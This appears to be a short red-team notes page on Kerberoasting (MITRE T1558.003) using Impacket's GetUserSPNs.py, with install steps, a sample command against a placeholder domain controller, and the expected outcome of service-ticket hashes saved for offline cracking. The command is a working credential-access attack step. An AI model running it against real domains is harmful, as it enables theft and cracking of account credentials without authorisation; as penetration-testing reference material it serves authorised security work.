# Red Team - Performing Kerberoasting

**Tool:** Impacket - GetUserSPNs.py  
**Tactic:** Credential Access  
**Technique:** Kerberoasting  
**MITRE ATT&CK ID:** T1558.003

## Requirements:
- Valid domain credentials (e.g., `john.doe@contoso.local`)
- dc-ip (e.g., `10.0.0.5`)
- Access to the internal network

## Install PIP3/Impacket
install pip3: 
```bash
sudo apt install python3-pip
```

Then: 
````bash
pip3 install pipx
````

Then: 
```bash
sudo apt install python3.10-venv
````

Then: 
````bash
python3 -m pipx install impacket
````
Then: 
````bash
python3 -m pipx ensurepath
````
Lastly: 
````bash
source ~/.bashrc
````

## Command Example:
```bash
python3 GetUserSPNs.py CONTOSO.LOCAL/john.doe -dc-ip 10.0.0.5 -outputfile kerberostickets.txt
````

## Expected Outcome

TGS requests sent for SPNs saved in keberostickets.txt

RC4-encrypted Kerberos service tickets returned

Hashes extracted and saved for offline cracking

